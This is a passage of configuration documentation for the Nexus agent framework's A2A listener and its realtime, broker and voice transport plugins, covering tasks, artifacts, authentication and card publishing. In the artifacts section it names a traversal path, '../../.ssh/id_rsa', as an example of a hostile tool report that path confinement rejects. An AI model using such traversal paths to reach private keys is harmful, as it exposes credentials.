| `TaskStatusUpdateEvent.metadata` under the Nexus extension URI | `thinking.step`, `tool.invoke`, `subagent.*`, and `llm.response` token usage — only for clients that opted in |
| Task `COMPLETED` | `agent.turn.end` |
| Task `FAILED` | a `core.error` that is fatal or has exhausted its retries, or a vetoed input |

`SendMessage` **blocks** until the task reaches a state the caller has to act
on and returns the Task, which is A2A's default (§3.2.2). That means a terminal
state **or** `INPUT_REQUIRED`: a task waiting for the caller cannot be waited on
by the caller. `SendStreamingMessage` writes the same frames as SSE — an opening
Task snapshot, status updates, the artifact, and the terminal status that closes
the stream.

`configuration.returnImmediately` is **honoured**: the call answers with the
task as it stands and the client follows it with `GetTask` or
`SubscribeToTask`. It was refused for as long as a run's lifetime was its
request's; see [Task lifetime](#task-lifetime) below. `SendStreamingMessage`
ignores the flag, because a stream is already the follow-up it asks for.

Other refusals, each with the error type the specification reserves for it: a
non-text Part or an `acceptedOutputModes` list with no text type
(`ContentTypeNotSupportedError`), an inline `taskPushNotificationConfig`
(`PushNotificationNotSupportedError`), and a second task while one is in flight
(`UnsupportedOperationError`; the listener fronts one agent loop). A message
naming a `taskId` is a **continuation**, not a refusal — see
[Interruption and cancellation](#interruption-and-cancellation).

#### Task lifetime

A run is this listener's single active task and is released when the **task**
reaches a terminal state — not when the HTTP request that started it returns.
Three things follow, and they are the reason interruption works at all:

- A client may **disconnect mid-turn** without failing its own task. The turn
  carries on, `GetTask` still answers, and `SubscribeToTask` reattaches to
  exactly where it got to.
- A task may stay parked on a question for as long as answering it takes,
  bounded by `tasks.input_timeout`.
- `configuration.returnImmediately` is answerable.

The cost is that a turn nobody is watching holds the slot until something ends
it, which is why `CancelTask` is wired and why an unanswered question has a
deadline. A task left non-terminal by a **process restart** is settled at
`FAILED` when the store next opens: no run drives it, no bus event will ever
name it, and only terminal tasks are evictable, so leaving it would be an
immortal row reading `WORKING` for ever.

#### Interruption and cancellation

There is no configuration here beyond `tasks.input_timeout`; the behaviour is
fixed.

**A question parks the task.** When a Nexus agent asks a human something —
`nexus.control.hitl`'s `ask_user` tool, or any plugin emitting `hitl.requested` —
the task moves to `TASK_STATE_INPUT_REQUIRED` with the question on
`status.message`, and a multiple-choice question renders its option ids into
that text so a text-only A2A client can answer it. The task stays **live**: open
SSE streams stay open (§11.7's close rule keys off terminal states, which this
is not), the transition is written through to the store, and a client that
reconnects reads the question from `GetTask` or from `SubscribeToTask`'s opening
snapshot.

**A message naming the same `taskId` resumes it** (§3.4). The answer is routed
to `hitl.responded` and the task returns to `WORKING` **inside the same turn** —
no `io.input`, no second task. An answer whose text matches one of the
question's option ids (case-insensitively) is delivered as that choice; anything
else is free text. Continuing a task is refused, with
`UnsupportedOperationError`, when it is already terminal, when the message names
a different `contextId` than the task's, or when the task is not waiting for
input. A `taskId` that does not belong to the caller answers exactly as an
unknown one does: `TaskNotFoundError`.

**`CancelTask` settles the task at `TASK_STATE_CANCELED`,** then tells the bus —
`hitl.cancel` if the task was parked, so the blocked agent loop unblocks, then
`cancel.request`, which is the `control.cancel` capability's own entry point
(the same event the TUI emits). Any open stream closes on the terminal frame.
Cancelling an **already-terminal** task is refused with
`TaskNotCancelableError` and writes nothing: a terminal state is final, so
reporting success would tell a client its cancel took effect on a task that had
already completed.

#### Task retention

Every task this listener creates is written to a SQLite database at
`<session>/plugins/nexus.io.a2a/store.db`, opened through the engine's
[per-plugin storage](../architecture/storage.md) capability at **session**
scope. There is no bespoke file format and no separate cleanup job: archiving
the session disposes of its tasks with it. A listener that cannot open the store
**does not start** — a task that existed only for the lifetime of its request is
exactly the lie the store exists to prevent.

The record holds the task id, its `contextId`, the current state with its
timestamp, the full status-transition history, every artifact, message
references for both sides of the exchange, and the authenticated `Principal`
that created it. Reads are **principal-scoped**: a caller can only ever reach
tasks filed under its own principal id, and there is no unscoped query in the
store's API to reach for by mistake. With no `auth:` block configured every
caller is unauthenticated and shares one partition.

Retention is load-bearing rather than housekeeping — a task carries its history
and its artifacts, so an unbounded store would grow with traffic rather than
with the conversation. Both knobs are enforced on open and after every task
creation, and a task is evicted when it exceeds **either** of them. Only
**terminal** tasks are evictable: a live task is the one a client is most likely
to be following, so it is never dropped mid-turn. Non-terminal tasks still
*count* against the per-context cap, so a wedged in-flight task shows up as
retention pressure instead of exempting itself from it.

| Key                     | Type            | Default | Description |
|-------------------------|-----------------|---------|-------------|
| `tasks.ttl`             | duration string | `24h`   | How long a terminal task is kept after its last transition. `"0s"` disables age-based eviction and keeps tasks for the life of the session. A bare number is rejected: `600` reads as ten minutes to an operator and six hundred nanoseconds to Go. Must not be negative. |
| `tasks.max_per_context` | int             | `200`   | How many tasks are kept per (principal, `contextId`) pair. `0` disables the cap. The cap is per **principal and** context, not per context alone, so one principal's traffic cannot evict another's tasks. Must not be negative. |
| `tasks.input_timeout`   | duration string | `15m`   | How long a task may stay parked at `TASK_STATE_INPUT_REQUIRED` waiting for the client to answer the agent's question. On expiry the task is driven to `FAILED` (a real terminal transition, so every attached stream closes) and `hitl.cancel` retracts the question so the blocked agent loop unblocks. `"0s"` disables the deadline. A bare number is rejected, as for `ttl`. Must not be negative. |

The defaults are chosen for the standalone single-context listener: 24 hours is
comfortably longer than any plausible client reconnect window, and 200 tasks is
200 turns of history — far more than a client polls back over.

**Sizing.** The artifact side of the store is bounded by
`artifacts.max_task_bytes x tasks.max_per_context`, which at the shipped defaults
is `1 MiB x 200` ≈ **200 MiB** in the worst case where every retained task
saturates its artifact budget. No ordinary session approaches that — a turn's
artifacts are the tool outputs it actually produced — but the product is stated
rather than implied, so an operator who cannot afford the worst case lowers one
of the two knobs by arithmetic instead of by guesswork. See
[Artifacts](#artifacts).

`input_timeout` is not retention — it is a **liveness** bound, and it defaults to
a non-zero value for a reason worth stating. A parked task is not idle: the turn
that asked the question is blocked inside `ask_user`, holding this listener's
single active-task slot and the process's one agent loop, so a question nobody
answers pins the whole instance. **15 minutes** is measured against a human, not
a machine — long enough for someone to be paged, read the question and reply,
short enough that an abandoned question frees the instance within one coffee
break. Set `"0s"` only if a task parked until the process exits is genuinely what
you want.

```yaml
plugins:
  nexus.io.a2a:
    tasks:
      ttl: 72h
      max_per_context: 50
      input_timeout: 5m
```

#### Artifacts

A2A puts task **output** in artifacts and conversation in messages (§3.7). Four
things a Nexus turn produces are output by that reading, and all four are
published without an operator enabling anything:

| Artifact | `artifactId` | Contents |
|---|---|---|
| The turn's answer | `<taskId>-response` | A text Part. Plus an `application/json` Part when the answer **is** a JSON document (one surrounding markdown fence is unwrapped first), so structured output is a document rather than a string a client has to re-parse. When an `llm.request` declared a `json_schema`, the artifact's metadata names it under `nexus.output.schema`. |
| One per tool result | `<taskId>-tool-<callId>` | A text Part with the tool's output (or its error, flagged `nexus.tool.failed`), plus an `application/json` Part when the tool produced structured output. Metadata carries `nexus.tool.name` and `nexus.tool.callId`. |
| One per written file | `<taskId>-file-<path>` | The file's bytes as an inline base64 `raw` Part with its filename and media type — or a metadata note when the file is over the cap. |
| The suppression notice | `<taskId>-artifacts-truncated` | Present only when the task spent its artifact budget; says how many artifacts were withheld. |

**Tool results are artifacts unconditionally.** There is no key to turn them off,
deliberately: an interop transport whose observability depends on the operator
having enabled it is one a partner cannot rely on. The volume that buys is
answered by the caps below rather than by a flag.

**A human-in-the-loop question is *not* an artifact.** It rides the
`INPUT_REQUIRED` status message and the task's message history, which is where a
request for input belongs — putting it in the output channel as well would count
one event twice.

**File detection is `tool.result`-based, and is incomplete by design.** A file is
published only when a tool *reports* having written it: through the engine's own
`ToolResult.OutputFile` field (honoured for every tool), or through a
structured-output key named by `artifacts.file_sources`. Snapshot-diffing the
session workspace is out of scope, so **a write by an uninstrumented path is
missed** — a shell command redirecting into a file reports stdout and an exit
code and nothing about the file, so nothing is published for it. `nexus.tool.shell`
therefore has **no default rule**; an operator whose shell wrapper does report a
written path adds one to `file_sources`.

Every reported path is resolved against `artifacts.file_base_dir` and **confined
to it**, symlinks followed. A path that escapes is dropped rather than clamped: a
tool reporting `../../.ssh/id_rsa` is either broken or hostile, and inlining what
it named into a response that leaves the process cannot be walked back.

`configuration.acceptedOutputModes` is **honoured, not merely validated**: a
request naming only text media types gets no `application/json` Part and no
inline file contents. The files are still reported, as the same metadata note an
oversized file gets, so the client learns they exist.

| Key                              | Type            | Default   | Description |
|----------------------------------|-----------------|-----------|-------------|
| `artifacts.max_file_bytes`       | int (bytes)     | `262144`  | Largest file whose contents are inlined as a base64 `raw` Part. A larger file **degrades to a metadata note** naming the file, its size and the cap — never a silent drop and never an unbounded inline. `0` means no file is ever inlined; every detected file becomes a note. Inline content is base64 in JSON, so it costs roughly a third more on the wire than on disk. Must not be negative. |
| `artifacts.max_tool_output_bytes`| int (bytes)     | `16384`   | Largest tool-result text carried on a tool-result artifact. Longer output is truncated on a rune boundary with a note saying how much was shown, and the artifact is flagged `nexus.artifact.truncated`. `0` disables the cap. Must not be negative. |
| `artifacts.max_task_bytes`       | int (bytes)     | `1048576` | One task's total artifact budget, counting every artifact **except** the final response — which is the turn's answer and is never suppressed. When the budget is spent, further artifacts are suppressed and one notice artifact records how many. `0` disables the budget, which makes the store's artifact growth unbounded. Must not be negative. |
| `artifacts.file_base_dir`        | string (path)   | *(the session's `files/` directory)* | Directory that reported file paths are resolved against and confined to. Expanded through `engine.ExpandPath`, so `~` works. Set it to match `nexus.tool.fileio`'s `base_dir` if you moved that. With no session and no value set, file artifacts are **disabled**: there is no safe base to resolve a relative path against. |
| `artifacts.file_sources`         | `map<string, string or list<string>>` | `{write_file: [path]}` | Which structured-output keys of which tools carry the paths those tools wrote. The default matches `nexus.tool.fileio`'s `write_file`. Setting this key **replaces** the default wholesale rather than merging with it. `ToolResult.OutputFile` is always honoured on top of it, for every tool. |

The caps are **load-bearing rather than tuning**. Unconditional tool-result
artifacts, times inline base64 file parts, times a disk-persisted store, is an
unbounded product; these three caps are what make it a bounded one. Per artifact
it is `max_file_bytes` / `max_tool_output_bytes`; per task it is
`max_task_bytes`; per store it is `max_task_bytes x tasks.max_per_context`.

```yaml
plugins:
  nexus.io.a2a:
    artifacts:
      max_file_bytes: 1048576
      max_tool_output_bytes: 8192
      max_task_bytes: 4194304
      file_base_dir: "~/agent-workspace"
      file_sources:
        write_file: [path]
        render_report: [output_path]
```

#### The Nexus extension

Thinking steps, tool calls, subagent progress and token counts have no canonical
A2A field. They ride the Nexus extension instead, whose URI is

```
https://github.com/frankbardon/nexus/a2a/extensions/agent-events/v1
```

There is **no configuration for it**: it is declared in the Agent Card under
`capabilities.extensions` for the same reason the capability booleans are
derived, and it is never `required` — everything it carries is supplementary, so
a client that ignores it still receives a complete canonical stream.

| Nexus event | Extension event kind | Payload |
|---|---|---|
| `thinking.step` | `thinking` | The reasoning text and its index within the turn. |
| `tool.invoke` | `tool_call` | The call id, tool name and the JSON arguments the model produced. |
| `tool.result` | `tool_result` | The call id, tool name, output (capped by `artifacts.max_tool_output_bytes`) and error. |
| `subagent.started` / `.iteration` / `.complete` | `subagent` | The spawn id, phase, iteration and detail. A subagent that reported an error is phase `failed`. |
| `llm.response` | `usage` | Per-call token accounting: input, output, cached, reasoning and total. Reported for **every** response including the intermediate tool-calling ones, so the turn's cost is the sum rather than the last call. |

The carrier is `TaskStatusUpdateEvent.metadata`, keyed by the extension URI. The
status those frames carry is the task's **current** state, not a hard-coded
`WORKING`: a telemetry frame emitted while the task is parked at
`INPUT_REQUIRED` must not tell a client the task went back to work.

**Opt-in is per request and is honoured by not sending.** A client asks with the
`A2A-Extensions` service parameter:

```bash
curl -sN localhost:8091/a2a \
  -H 'A2A-Version: 1.0' \
  -H 'A2A-Extensions: https://github.com/frankbardon/nexus/a2a/extensions/agent-events/v1' \
  -d '{"jsonrpc":"2.0","id":1,"method":"SendStreamingMessage","params":{…}}'
```

The response echoes `A2A-Extensions` with the extensions that were actually
**activated**, so a client asking for several can tell which it got; an extension
this agent does not speak produces no echo and no error. A client that asked for
nothing receives a stream with no extension metadata on it at all.

**Telemetry is not persisted.** It is the one frame class that does not go
through the task store's write-through path. A stored telemetry frame would land
in the status history as a `WORKING` transition, so `GetTask` would replay a
turn's reasoning as state changes the task never made — and a long turn would
fill the history table with them. `GetTask` and `SubscribeToTask`'s opening
snapshot therefore carry the canonical task only; telemetry is a live signal on
an attached stream.

#### Reading tasks

`GetTask`, `ListTasks` and `SubscribeToTask` answer from the store above. There
is no configuration for any of them; the behaviour below is fixed.

| Operation | JSON-RPC | REST |
|---|---|---|
| `GetTask` | `params: {id, historyLength?}` | `GET <rest_prefix>/tasks/{id}?historyLength=` |
| `ListTasks` | `params: {contextId?, status?, pageSize?, pageToken?, historyLength?, statusTimestampAfter?, includeArtifacts?}` | `GET <rest_prefix>/tasks?…` (§11.5 camelCase query parameters) |
| `SubscribeToTask` | `params: {id}` → SSE | `POST <rest_prefix>/tasks/{id}:subscribe` → SSE |

- **History** is the trail of message *references* the store retained, rendered
  as text messages stamped with their task and context — not a replay of
  `memory.history`. §3.7 leaves it to the server which messages are persisted,
  so a bounded reference trail is a conforming history. `historyLength` unset
  keeps everything retained, `0` omits history, and `N` keeps the most recent
  `N` messages.
- **`ListTasks` pagination** defaults to a page size of 50 and is bounded to
  1–100 (§3.2). `nextPageToken` is an opaque **keyset** cursor over
  `(created_at, rowid)`, not an offset, so a task created or evicted mid-walk
  cannot make a client skip or repeat a row. A token this server did not mint is
  an `InvalidParamsError`, not a silent restart. `totalSize` is counted under the
  identical filters, so it counts the same set the client is paging through.
- **`includeArtifacts` defaults to false**, per §3.2, so a page stays small;
  `GetTask` always returns artifacts. History has no such default in the
  specification and is therefore included in a listing unless the request caps
  it — pass `historyLength: 0` for a compact page.
- **`SubscribeToTask`** always opens with the task's current state. A live task
  then streams the same frames every other attached stream receives — several
  clients may follow one task and all see an identical sequence from the point
  they joined. An already-terminal task yields its terminal snapshot and the
  stream closes immediately. A task that is neither (one this process was
  serving when it last stopped) gets its snapshot and then a close, since
  nothing will ever update it again — though after a restart such a task is
  settled at `FAILED` when the store opens, so the snapshot names a real ending.
- **Ownership is not enumerable.** Every read goes through the store's
  principal-scoped view, so a task belonging to another principal answers
  exactly as an unknown id does: the same `TaskNotFoundError`, the same HTTP
  404, the same body, from the same single lookup. A distinct "exists but is not
  yours" answer would be an existence oracle for ids the caller was never told.

#### `contextId` and the Nexus session

An A2A context is a conversation and so is a Nexus session, so `contextId` maps
onto the session — but a Nexus process owns exactly **one** session, fixed at
boot, and there is no bus primitive that starts a second one or resets history.
The binding follows from that:

- The first call **claims** the session. A client that names no `contextId` is
  assigned the session id and gets it back on the Task, so it can keep using it.
- Later calls naming the **same** context continue the conversation, with
  history intact — `memory.history` persists across turns within a session.
- A **different** `contextId` is refused with `UnsupportedOperationError` naming
  the bound context. Accepting it would hand the caller a conversation already
  carrying another context's history while calling it new. Run one instance per
  context; the [session broker](../guides/session-broker.md) automates exactly
  that.

#### Agent Card content

`card:` is the **hand-authored** half of the discovery document.

| Key                            | Type            | Default     | Description |
|--------------------------------|-----------------|-------------|-------------|
| `card.name`                    | string          | *(required)*| Human-readable agent name. |
| `card.description`             | string          | *(required)*| What the agent does. Required by the A2A specification, so it is always serialized. |
| `card.version`                 | string          | *(required)*| The agent's own version, independent of the A2A protocol version. |
| `card.documentation_url`       | string          | *(empty)*   | URL of human-readable documentation. |
| `card.icon_url`                | string          | *(empty)*   | URL of an icon representing the agent. |
| `card.provider.organization`   | string          | *(required when `provider` is set)* | The operating organization's name. |
| `card.provider.url`            | string          | *(empty)*   | The provider's website. |
| `card.default_input_modes`     | string or list<string> | *(empty)* | Media types the agent accepts when a skill does not narrow them, e.g. `text/plain`. |
| `card.default_output_modes`    | string or list<string> | *(empty)* | Media types the agent produces when a skill does not narrow them. |
| `card.skills`                  | list<map>       | *(required, ≥1)* | What the agent advertises it can do. |
| `card.skills[].id`             | string          | *(required)*| Unique skill id within the card. |
| `card.skills[].name`           | string          | *(required)*| Human-readable skill name. |
| `card.skills[].description`    | string          | *(required)*| What the skill does. |
| `card.skills[].tags`           | string or list<string> | *(empty)* | Keywords for discovery and filtering. |
| `card.skills[].examples`       | string or list<string> | *(empty)* | Sample prompts that exercise the skill. |
| `card.skills[].input_modes`    | string or list<string> | *(empty)* | Narrows `default_input_modes` for this skill. |
| `card.skills[].output_modes`   | string or list<string> | *(empty)* | Narrows `default_output_modes` for this skill. |

**Skills are deliberately hand-authored** — they are **not** derived from
`nexus.skills` or the tool catalog. The card is a public contract: an internal
catalog churns with every plugin an operator enables, and a discovery document
that churned with it would both leak internal structure and break clients that
keyed off it.

**There are no keys for `supportedInterfaces`, `capabilities`,
`securitySchemes` or `securityRequirements`, and there never will be.** Those
describe what the listener actually does, so they are **derived** and overwrite
whatever the card source carried — including a complete `card_file` document. A
card naming a URL nothing is bound to, a capability nothing implements, or a
scheme nothing enforces is worse than no card: it is a confident wrong answer.
Concretely:

- `supportedInterfaces` is `[{public_url + jsonrpc_path, JSONRPC, 1.0},
  {public_url + rest_prefix, HTTP+JSON, 1.0}]`, in that preference order.
- `capabilities.streaming` / `pushNotifications` / `extendedAgentCard` are
  computed from the set of operations the plugin actually implements.
- `securitySchemes` / `securityRequirements` come from the validator chain.

The card is rendered and validated **at boot**: a card that could not be served
fails the process start, not the first partner's request. It is served with an
`ETag` (a hash of the card content, so an edit that does not bump
`card.version` still invalidates a cache) and `Cache-Control: public,
max-age=300`, per specification §8.6.1; `If-None-Match` yields `304`.

#### Agent Card security schemes

The card's `securitySchemes` and `securityRequirements` are derived from the
configured validators, so what a client is told to present is what the chain
enforces. One validator becomes one named scheme plus one requirement entry;
the scheme name is the chain-order name `nexusauth` already assigned (`static`,
`jwks`, `jwks#2`), so the card and the boot log name the same thing.

| Validator type   | Scheme published |
|------------------|------------------|
| `static` (and the desugared `bearer_token`) | `httpAuthSecurityScheme` with `scheme: Bearer`. |
| `jwks`           | `httpAuthSecurityScheme` with `scheme: Bearer`, `bearerFormat: JWT`; the description names the configured `issuer` and `audience` so a client knows where to obtain a token. |
| `introspect`     | `httpAuthSecurityScheme` with `scheme: Bearer` and **no** `bearerFormat` — an introspected token is opaque by construction. |
| `proxy_headers`  | **Nothing.** This validator accepts no client credential: it honours an identity a trusted fronting proxy already established and refuses those headers from anyone outside the CIDR allowlist. Publishing a scheme would instruct clients to send a header guaranteed to be ignored, or invite them to assert an identity directly. Auth is still enforced. |

Requirements are emitted as **separate entries** rather than one entry naming
every scheme, because that is the accurate translation of a `nexusauth.Chain`:
the chain is first-success, so satisfying *any* validator suffices, and A2A
spells "any of these alternatives" as separate members of the
`securityRequirements` array. With no validators configured the card carries no
`securitySchemes` at all, which is the honest document for a listener that
admits everyone — and is why the bind address defaults to loopback.

#### Agent Card auth posture

`GET /.well-known/agent-card.json` is **unauthenticated by default**, even when
every operation is guarded.

Specification §8.2 makes the well-known URI a pre-authentication bootstrap step:
a client fetches the card precisely to discover which credentials to obtain
(§7.3, step 1), so gating it behind those same credentials is circular and
breaks every conforming client. The specification's answer for a card that must
stay private is a separate authenticated document behind
`GetExtendedAgentCard` (§6.9), which this plugin does not implement and honestly
declares as `false`.

The counter-argument is real, and is why `card_requires_auth` exists: this card
names a *private* agent, and its description, skills and examples may describe
capability an operator would rather not publish. Two things answer it. First,
the listener binds loopback by default, so the "public" document is not
reachable from anywhere the operator did not deliberately open. Second, the
card's contents are hand-authored for exactly this reason — nothing is derived
from the tool catalog, so what the card reveals is what an operator chose to
reveal.

An operator who moves `bind` off loopback and still needs the card private sets
`card_requires_auth: true` and distributes the document out-of-band, which §8.2
explicitly sanctions ("Direct Configuration"). That is a real trade — it makes
the agent undiscoverable to clients that have not already been told about it —
so it is opt-in, not the default.

`OPTIONS` preflight on every route is **never** authenticated: a browser does
not attach `Authorization` to a preflight.

#### A2A version negotiation

Specification §3.6.2 says an agent MUST interpret an empty `A2A-Version` as
`0.3`. `pkg/a2a` implements that literally, and since the codec speaks only
`1.0`, the literal reading turns every header-less request into a
`VersionNotSupportedError`. That rule exists to protect clients that predate the
parameter — an agent that used to serve `0.3` must not silently reinterpret an
old client's requests under new semantics.

**This listener has no such client to protect**, so the default is the lenient
reading:

| `strict_version_header` | Absent `A2A-Version` is read as | Effect |
|-------------------------|--------------------------------|--------|
| `false` *(default)*     | `1.0`                          | The request is processed. Every response carries `A2A-Version: 1.0` so the client can see what it was processed as rather than infer it. |
| `true`                  | `0.3`                          | The literal §3.6.2 behaviour: the request is refused with `VersionNotSupportedError`. |

An *explicit* unsupported version (`A2A-Version: 0.3`) is refused under **both**
settings — the policy only governs absence. The parameter may also ride a query
parameter (`?A2A-Version=1.0`), which §3.6.1 permits.

Set `strict_version_header: true` for a conformance harness, or for a
deployment that will later front a `0.3` interface from the same origin.

#### Error envelopes

Each binding answers in its own shape, so a client parses one format per
endpoint:

| Condition | JSON-RPC binding | REST binding |
|---|---|---|
| Protocol error (bad params, unknown method, unsupported operation, unsupported version) | HTTP `200` with a JSON-RPC error object carrying the A2A code (`-32602`, `-32601`, `-32004`, `-32009`, …) and the request id echoed. `200` is the JSON-RPC contract: the outcome rides the body. | The §11.6 `google.rpc.Status` body with the A2A error's mapped HTTP status and a `google.rpc.ErrorInfo` detail (`domain: a2a-protocol.org`). |
| Authentication / authorization refusal | HTTP `401`/`403`/`503` **plus** a JSON-RPC error object with code **`-32000`** and an `ErrorInfo` detail (`domain: nexus.io.a2a`). | The same `google.rpc.Status` shape with status `UNAUTHENTICATED` / `PERMISSION_DENIED` / `UNAVAILABLE`. |
| Unknown path under `rest_prefix` | — | `404` with `MethodNotFoundError`. |
| Known path, wrong verb | — | `405` with an `Allow` header naming the verb that would have worked. |

A2A defines no authentication error in its taxonomy: §3.3.2 names "HTTP 401
Unauthorized, gRPC UNAUTHENTICATED, **JSON-RPC custom error**", leaving the
code to the implementation. `-32000` is the one value in JSON-RPC 2.0's
implementation-defined server-error range that A2A does *not* claim for itself
(A2A reserves `-32001`…`-32099`), so it cannot collide with a protocol error a
client already knows how to interpret. The HTTP status stays the authoritative
signal; the body exists so a client that only parses envelopes still gets a
well-formed one. The RFC 6750 `WWW-Authenticate` challenge and the `Retry-After`
on `503` follow the same status mapping `nexus.io.agui` and the broker use — the
denial kinds are the shared package's transport contract, and one deployment
should not answer the same refusal three different ways.

#### Example

```yaml
plugins:
  nexus.io.a2a:
    bind: "0.0.0.0:8091"
    public_url: "https://agent.example.com"
    bearer_token_env: NEXUS_A2A_TOKEN
    cors_origins: ["https://console.example.com"]
    card:
      name: "Nexus Research Agent"
      description: "Runs research turns with web search and file tools."
      version: "1.2.0"
      documentation_url: "https://example.com/docs/agent"
      provider:
        organization: "Example Inc."
        url: "https://example.com"
      default_input_modes: ["text/plain"]
      default_output_modes: ["text/plain"]
      skills:
        - id: research
          name: "Research a topic"
          description: "Searches the web and summarizes findings with citations."
          tags: ["research", "search", "summarization"]
          examples:
            - "Summarize the last three papers on retrieval-augmented generation."
```

### `nexus.io.realtime`

Source: `plugins/io/realtime/plugin.go`. WebSocket bidirectional transport
for low-latency clients (browser front-ends, native voice clients) that
want raw `stream.delta` deltas, tool previews, voice audio chunks, and
cancel envelopes without going through the `nexus.io.browser` UI hub.

| Key            | Type   | Default  | Description |
|----------------|--------|----------|-------------|
| `listen_addr`  | string | `:7676`  | TCP address the WebSocket server binds to. |
| `path`         | string | `/ws`    | URL path the WebSocket handler is mounted at. |
| `max_clients`  | int    | `16`     | Concurrent connection cap. New dials past the cap receive HTTP 503. |

**Outbound envelopes** (server → client, JSON): `stream.delta`, `stream.end`,
`tool.preview`, `audio.chunk`, `cancel.complete`, `hitl.request`.

**Inbound envelopes** (client → server, JSON): `input`, `audio.chunk`,
`cancel`, `approval`.

**No auth in v1.** Origin checks and bearer-token validation are tracked
follow-ups; operators running this on a public network must front it
with a reverse proxy that does its own authentication.

### `nexus.io.broker`

Source: `plugins/io/broker/plugin.go`. Dial-back IO transport for Nexus
instances spawned by the session broker (`cmd/nexus-broker`). Unlike
`nexus.io.browser` / `nexus.io.realtime`, which LISTEN, this plugin DIALS OUT
to the broker's instance gateway over WebSocket — the broker is the only
listening socket. On `Ready` it dials `broker_addr`, sends a `register` frame
keyed by `lease_id`, announces readiness, and reports the engine session id
(for later `-recall` resume) before bridging IO frames in both directions.

Config keys fall back to environment variables the broker injects at spawn, so
operators normally set neither by hand:

| Key           | Type   | Default                     | Description |
|---------------|--------|-----------------------------|-------------|
| `broker_addr` | string | `$NEXUS_BROKER_ADDR`        | WebSocket URL of the broker's instance dial-back endpoint (e.g. `ws://127.0.0.1:8080/instance`). Falls back to the `NEXUS_BROKER_ADDR` env var. When empty the plugin stays dormant (no dial). |
| `lease_id`    | string | `$NEXUS_BROKER_LEASE_ID`    | Lease id assigned by the broker at spawn; echoed in the `register` frame. Falls back to the `NEXUS_BROKER_LEASE_ID` env var. When empty the plugin stays dormant. |
| `spawn_secret` | string | `$NEXUS_BROKER_SPAWN_SECRET` | Per-spawn secret the broker generates for this instance and injects at exec; echoed in the `register` frame alongside `lease_id`. Falls back to the `NEXUS_BROKER_SPAWN_SECRET` env var. Empty does **not** make the plugin dormant — it dials and is refused. Every broker requires it, with or without an `auth:` block. |

The `spawn_secret` is a **second factor for the dial-back socket**. The lease id
alone is a poor authenticator for it: the same value appears in `ws_url`s, client
requests and logs, so anything that observes one could otherwise impersonate an
instance. The broker records the expected value on the lease and injects it
through the environment (never argv, which is world-readable). Both the lease id
and the secret must match or the dial-back is closed with the same
policy-violation close an unknown lease gets.

How the broker produces the value depends on whether it keeps state — the plugin
echoes whatever it was handed either way. With no `state_dir` it is 128 bits of
`crypto/rand` per spawn, held only in memory. With a `state_dir` it is derived as
`HMAC-SHA256(<state_dir>/spawn-key, lease_id)`, so a restarted broker can
recompute the value a surviving instance still holds; the secret itself is still
never written to disk. See
[Restart recovery](#restart-recovery-reattach_window).

Enforcement on the broker side is **unconditional**: every register frame must
carry the secret, with or without an `auth:` block, on a freshly claimed lease or
on one restored after a broker restart. It used to be gated on `auth:`, which
meant an unauthenticated broker authenticated its dial-back socket with a lease id
alone — a value that travels in `ws_url`s, client requests and logs. **A `nexus`
build that predates the protocol is therefore now refused everywhere**, and
removing the `auth:` block is no longer a workaround; upgrade the binary the
[binary registry](#binary-registry-binaries) entry points at. The value is never
logged and never appears in `GET /leases`. See
[Instance dial-back authentication](#instance-dial-back-authentication-ws-instance).

**Outbound IO messages** (instance → broker → client, JSON inside the frame
payload): `output`, `stream.delta`, `stream.end`, `status`, `approval.request`,
`hitl.request`, `cancel.complete`.

**Inbound IO messages** (client → broker → instance): `input`,
`approval.response`, `hitl.response`, `cancel`.

The connection reconnects with exponential backoff until shutdown. On an
inbound `shutdown` frame (sent by the broker for `POST /release` and later
idle/crash teardown) the plugin emits `io.session.end`, which drives a clean
engine `Stop` that flushes and persists the session before the process exits;
the reconnect loop is latched off so the graceful teardown is not undone. There
is **no auth in the plugin itself** — the broker gateway owns lease validation
and any transport-level authentication.

### `nexus.io.voice`

Source: `plugins/io/voice/plugin.go`. Bus-driven voice IO bridge:
consumes `voice.audio.input.chunk` events (typically from
`nexus.io.realtime`), runs simple energy-based VAD plus ASR via the
OpenAI Whisper API, and emits `io.input`. Consumes `llm.response`,
runs TTS via the OpenAI `/audio/speech` endpoint, and emits
`voice.audio.output.chunk` frames back. Implements barge-in: a
speech-energy input chunk arriving while a TTS turn is in flight emits
`cancel.request{Source: "voice"}`.

Local-model providers (`local_whisper`, `faster_whisper`,
`distil_whisper` for ASR; `kokoro`, `local_*`, `*_local` for TTS) are
recognized by the schema but rejected at `Init` with a clear error
pointing at issue #92, where the local-model bootstrapping work is
tracked separately.

| Key                  | Type    | Default            | Description |
|----------------------|---------|--------------------|-------------|
| `asr.provider`       | string  | `openai_whisper`   | Only `openai_whisper` is wired in this PR. Local-model values rejected pending #92. |
| `asr.api_key_env`    | string  | `OPENAI_API_KEY`   | Env var that holds the API key. |
| `asr.api_key`        | string  | *(none)*           | Inline API key. Overrides `api_key_env`. |
| `asr.model`          | string  | `whisper-1`        | Whisper model id. |
| `asr.endpoint`       | string  | OpenAI default     | Override URL for the transcription endpoint (test injection). |
| `tts.provider`       | string  | `openai`           | Only `openai` is wired in this PR. Local-model values rejected pending #92. |
| `tts.api_key_env`    | string  | `OPENAI_API_KEY`   | Env var that holds the API key. |
| `tts.api_key`        | string  | *(none)*           | Inline API key. Overrides `api_key_env`. |
| `tts.model`          | string  | `tts-1`            | TTS model id. |
| `tts.voice`          | string  | `alloy`            | Voice preset id. |
| `tts.streaming`      | bool    | `true`             | Always true in v1; reserved for future non-streaming mode. |
| `tts.endpoint`       | string  | OpenAI default     | Override URL for the speech endpoint (test injection). |
| `tts.chunk_bytes`    | int     | `8192`             | Frame size in bytes for emitted output chunks. |
| `vad.threshold`      | number  | `0.02`             | RMS energy threshold (normalized 0..1) above which the buffer is considered speech. |
| `vad.silence_ms`     | integer | `600`              | Milliseconds of below-threshold audio that triggers an utterance flush. |
| `barge_in.enabled`   | bool    | `true`             | Cancel an in-flight TTS turn when new speech is detected. |
| `barge_in.threshold` | number  | `vad.threshold`    | RMS threshold above which an incoming chunk is treated as barge-in. |
| `text_fallback`      | bool    | `true`             | Allow `io.input` from non-voice transports to flow through unchanged. |

VAD energy is computed as RMS over little-endian PCM int16 samples for
`audio/wav` / `audio/pcm` / `audio/l16`. For compressed containers
(webm/opus, mpeg/mp3) the bytes are not PCM and we fall back to a
byte-level energy heuristic until a proper decode is added — flagged
with a `TODO(#91)` in `plugins/io/voice/vad.go`.

### `nexus.io.test`

Source: `plugins/io/test/plugin.go`. Non-interactive testing transport.

| Key                      | Type     | Default     | Description |
|--------------------------|----------|-------------|-------------|
